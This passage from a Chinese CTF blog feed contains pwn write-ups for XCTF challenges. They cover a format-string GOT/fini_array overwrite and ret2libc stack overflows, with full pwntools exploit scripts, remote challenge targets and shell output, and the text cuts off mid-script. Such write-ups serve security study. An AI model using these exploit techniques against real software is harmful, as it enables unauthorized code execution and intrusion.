system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span>strlen_got <span class="token operator">=</span> <span class="token number">0x08049A54</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>strlen_addrstart <span class="token operator">=</span>      <span class="token number">0x080484F0</span> </code></pre><p>发现0x080485A0 地址和start地址只有最后两字节不同所以要打印的字符串最少（%n），然后就是向strlen_got中覆盖system_plt。<br>如果直接把0x08048490一次全部覆盖那么要打印：128MB的大小</p><pre class=" language-java"><code class="language-java">In <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x08048490</span>Out<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">134513808</span>In <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">134513808</span><span class="token operator">/</span><span class="token number">1024</span>Out<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">131361</span>In <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">131361</span><span class="token operator">/</span><span class="token number">1024</span>Out<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">128</span></code></pre><blockquote><p>如果我们所有的试验都是在本机/虚拟机和docker之间进行，不会受到网络环境的影响。而在实际的比赛和漏洞利用环境中，一次性传输如此大量的数据可能会导致网络卡顿甚至中断连接。所以不能这么暴力，所以说还是得精心构造~~，要使打印的数据尽量少。<br>所以我们覆盖那些覆盖量少的地址，这样就能有效减少打印数据量。<br>那么应该是先让把fini_array 里面的地址覆盖为start,两个字节（hn）.然后也分两个字节（hn）覆盖strlen_got里面的地址（strlen_addr）。注意这是小端序即高地址存放高字节数据，低地址存放低字节数据</p></blockquote><pre class=" language-java"><code class="language-java">举例：var <span class="token operator">=</span> <span class="token number">0x11223344</span>，对于这个变量的最高字节为<span class="token number">0x11</span>，最低字节为<span class="token function">0x44</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>大端模式存储（存储地址为<span class="token number">16</span>位）地址                    数据<span class="token function">0x0004</span><span class="token punctuation">(</span>高地址<span class="token punctuation">)</span>     <span class="token number">0x44</span><span class="token number">0x0003</span>                 <span class="token number">0x33</span><span class="token number">0x0002</span>                 <span class="token number">0x22</span><span class="token function">0x0001</span><span class="token punctuation">(</span>低地址<span class="token punctuation">)</span>     <span class="token function">0x11</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>小端模式存储（存储地址为<span class="token number">16</span>位）地址                    数据<span class="token function">0x0004</span><span class="token punctuation">(</span>高地址<span class="token punctuation">)</span>     <span class="token number">0x11</span><span class="token number">0x0003</span>                 <span class="token number">0x22</span><span class="token number">0x0002</span>                 <span class="token number">0x33</span><span class="token function">0x0001</span><span class="token punctuation">(</span>低地址<span class="token punctuation">)</span>     <span class="token number">0x44</span></code></pre><p>差点忘了测偏移量了~~</p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ <span class="token punctuation">.</span>/greeting Hello<span class="token punctuation">,</span> I'm nao<span class="token operator">!</span>Please tell me your name<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> AABB<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%p<span class="token punctuation">.</span>%pNice to meet you<span class="token punctuation">,</span> AABB<span class="token punctuation">.</span><span class="token number">0x80487d0</span><span class="token punctuation">.</span><span class="token number">0xff91489c</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0x6563694e</span><span class="token punctuation">.</span><span class="token number">0x206f7420</span><span class="token punctuation">.</span><span class="token number">0x7465656d</span><span class="token punctuation">.</span><span class="token number">0x756f7920</span><span class="token punctuation">.</span><span class="token number">0x4141202c</span><span class="token punctuation">.</span><span class="token number">0x252e4242</span><span class="token punctuation">.</span><span class="token number">0x70252e70</span><span class="token punctuation">.</span><span class="token number">0x2e70252e</span><span class="token punctuation">.</span><span class="token number">0x252e7025</span> <span class="token operator">:</span><span class="token punctuation">)</span></code></pre><p>AA的ASCII的偏移为11，BB的ASCII的偏移为12，两者分开了，应该存入时栈没有对齐。<br>也可以在IDA伪码中算出偏移：<br>因为printf的s===&gt;esp+0x1c.   sprintf(&amp;s, “Nice to meet you, %s :)\n”, &amp;v5)；函数使得我们的输入（v5）距离s为18.所以0x1c-0x4+18==42  42/4 = 10.2这也是为啥上面AABB分开的原因，我们可以先用两个padding对齐，然后在存入关键数据。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./greeting'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',41988)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>fini_array <span class="token operator">=</span> <span class="token number">0x08049934</span>system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span>strlen_got <span class="token operator">=</span> <span class="token number">0x08049A54</span>start <span class="token operator">=</span>      <span class="token number">0x080484F0</span> payload <span class="token operator">=</span> <span class="token string">'AA'</span>   <span class="token comment" spellcheck="true">#用来对齐的padding</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#12   //从低地址覆盖到高地址，两个字节。覆盖量：0x0804</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#13    //覆盖量：0x8490</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#14  //覆盖量：0x84F0 </span>payload <span class="token operator">+=</span> <span class="token string">'%2020c%12$hn%31884c%13$hn%96c%14$hn'</span>    <span class="token comment" spellcheck="true">#用hn就是让printf函数向目标地址最多写满两个字节，还有别忘了前面的输出也算上</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>                                      <span class="token comment" spellcheck="true">##补充，%hhn写1字节，%lln写8字节。</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果</p><pre class=" language-java"><code class="language-java">Hello<span class="token punctuation">,</span> I'm nao<span class="token operator">!</span>Please tell me your name<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> $ <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x8</span> bytes<span class="token operator">:</span>    <span class="token string">'/bin/sh\n'</span>$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h2 id="MASS"><a href="#MASS" class="headerlink" title="MASS"></a>MASS</h2><p>为啥不用fmt漏洞覆盖plt表，而时偏要覆盖got表？<br>因为plt存放的时指令，got表才是存放地址。比如把plt这里的jmp数据给覆盖成目标地址，那也没法跳转啊</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10i <span class="token number">0x80484c0</span>   <span class="token number">0x80484c0</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token operator">:</span>    jmp    DWORD PTR ds<span class="token operator">:</span><span class="token number">0x8049a54</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>got表   <span class="token number">0x80484c6</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">6</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x40</span>   <span class="token number">0x80484cb</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@plt</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jmp    <span class="token number">0x8048430</span>第一次执行strlen以后，这里就是存放真实地址，而且有plt来帮忙跳转，把这里的地址覆盖了岂不美哉（doge）pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10x <span class="token number">0x8049a54</span><span class="token number">0x8049a54</span> <span class="token operator">&lt;</span>strlen<span class="token annotation punctuation">@got</span><span class="token punctuation">.</span>plt<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0xf7dea900</span>    <span class="token number">0xf7d7dd90</span>    <span class="token number">0x080484e6</span>    <span class="token number">0x00000000</span><span class="token number">0x8049a64</span><span class="token operator">:</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000000</span></code></pre><p>在这个got表存放了system_plt后就会跳到system_plt去执行。应该换成system_got也没问题。</p><p>参考资料：<a href="https://www.hacksec.cn/Penetration-test/1137.html" target="_blank" rel="noopener">https://www.hacksec.cn/Penetration-test/1137.html</a><br><a href="https://bbs.ichunqiu.com/thread-43624-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43624-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-PWN-200</title>
      <link href="/2020/09/02/xctf-challenge-pwn-200/"/>
      <url>/2020/09/02/xctf-challenge-pwn-200/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec pwn<span class="token operator">-</span><span class="token number">200</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/pwn-200'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span>基操</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-6Ch]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-68h]</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-64h]</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-60h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-5Ch]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-58h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-54h]</span>  buf <span class="token operator">=</span> <span class="token string">'cleW'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//小端序</span>  v2 <span class="token operator">=</span> <span class="token string">' emo'</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token string">'X ot'</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token string">'FTCD'</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token string">'5102'</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token string">'\n!~'</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v7<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">76u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//输出 提示语</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_8048484</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>vulnerable：ssize_t <span class="token function">sub_8048484</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-6Ch]</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//栈溢出漏洞</span><span class="token punctuation">}</span></code></pre><h3 id="可用字符"><a href="#可用字符" class="headerlink" title="可用字符"></a>可用字符</h3><pre class=" language-java"><code class="language-java">LOAD<span class="token operator">:</span><span class="token number">08048154</span>    <span class="token number">00000013</span>    C    <span class="token operator">/</span>lib<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token punctuation">.</span>so<span class="token number">.2</span>LOAD<span class="token operator">:</span><span class="token number">08048269</span>    <span class="token number">0000000F</span>    C    __gmon_start__LOAD<span class="token operator">:</span><span class="token number">08048278</span>    0000000A    C    libc<span class="token punctuation">.</span>so<span class="token number">.6</span>LOAD<span class="token operator">:</span><span class="token number">08048282</span>    <span class="token number">0000000F</span>    C    _IO_stdin_usedLOAD<span class="token operator">:</span><span class="token number">08048291</span>    <span class="token number">00000006</span>    C    stdinLOAD<span class="token operator">:</span><span class="token number">08048297</span>    <span class="token number">00000005</span>    C    readLOAD<span class="token operator">:</span>0804829C    <span class="token number">00000007</span>    C    stdoutLOAD<span class="token operator">:</span>080482A3    <span class="token number">00000007</span>    C    setbufLOAD<span class="token operator">:</span>080482AA    <span class="token number">00000012</span>    C    __libc_start_mainLOAD<span class="token operator">:</span>080482BC    <span class="token number">00000006</span>    C    writeLOAD<span class="token operator">:</span>080482C2    0000000A    C    GLIBC_2<span class="token number">.0</span><span class="token punctuation">.</span>eh_frame<span class="token operator">:</span>080486B3    <span class="token number">00000005</span>    C    <span class="token punctuation">;</span><span class="token operator">*</span><span class="token number">2</span>$\"</code></pre><p>没有system , /bin/sh , 后门</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>第一次攻击<ul><li>栈溢出控制程序流程</li><li>构造write函数泄露某函数真实地址</li><li>返回到start</li></ul></li><li>第二次攻击<ul><li>利用泄露的真实地址得到libc版本</li><li>获取libc地址，system，/bin/sh</li><li>栈溢出，构造system函数</li></ul></li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn-200'</span><span class="token punctuation">)</span>start <span class="token operator">=</span> <span class="token number">0x080483D0</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sh = process('./pwn-200')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">55272</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">112</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span>offsetpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>start<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> write_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> libc_addr<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span>offsetrop <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>rop <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rop<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java">Welcome to XDCTF2015<span class="token operator">~</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> ubuntu<span class="token operator">-</span>xenial<span class="token operator">-</span>amd64<span class="token operator">-</span>libc6<span class="token operator">-</span><span class="token function">i386</span> <span class="token punctuation">(</span>id libc6<span class="token operator">-</span>i386_2<span class="token number">.23</span><span class="token operator">-</span>0ubuntu10_amd64<span class="token punctuation">)</span> be choosed<span class="token punctuation">.</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7d</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token operator">*</span>    <span class="token number">00000070</span>  <span class="token number">40</span> b9 <span class="token number">59</span> f7  ef be ad de  2b a0 6b f7  0a           │@·Y·│····│<span class="token operator">+</span>·k·│·│    <span class="token number">0000007d</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ ls</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-PWN-100</title>
      <link href="/2020/09/01/xctf-challenge-pwn-100/"/>
      <url>/2020/09/01/xctf-challenge-pwn-100/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-python"><code class="language-python">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec pwn<span class="token number">-100</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/pwn-100'</span>    Arch<span class="token punctuation">:</span>     amd64<span class="token number">-64</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Partial RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled    PIE<span class="token punctuation">:</span>      No PIE <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>基操</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c">main：__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40068E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">sub_40068E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>  <span class="token function">sub_40063D</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// read（0，&amp;v1，200）</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>__int64 __fastcall <span class="token function">sub_40063D</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">>=</span> a2 <span class="token punctuation">)</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>关键函数在于sub_40063D，功能和read函数一样read（0，&amp;v1，200），但这里强制读满200个字符</strong></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>sub_40068E函数中的sub_40063D实现了read函数的功能，可以控制程序流程</li><li>没有system，/bin/sh，更没有后门</li><li>用puts函数泄露真实地址，获取libc版本，从而获取system，/bin/sh</li><li>所以进行两次攻击</li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn-100'</span><span class="token punctuation">)</span>libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400763</span>start_addr <span class="token operator">=</span> <span class="token number">0x000400550</span><span class="token comment" spellcheck="true">#sh = process('./pwn-100')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">54326</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> <span class="token number">0x00000000004004e1</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x40</span> payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token 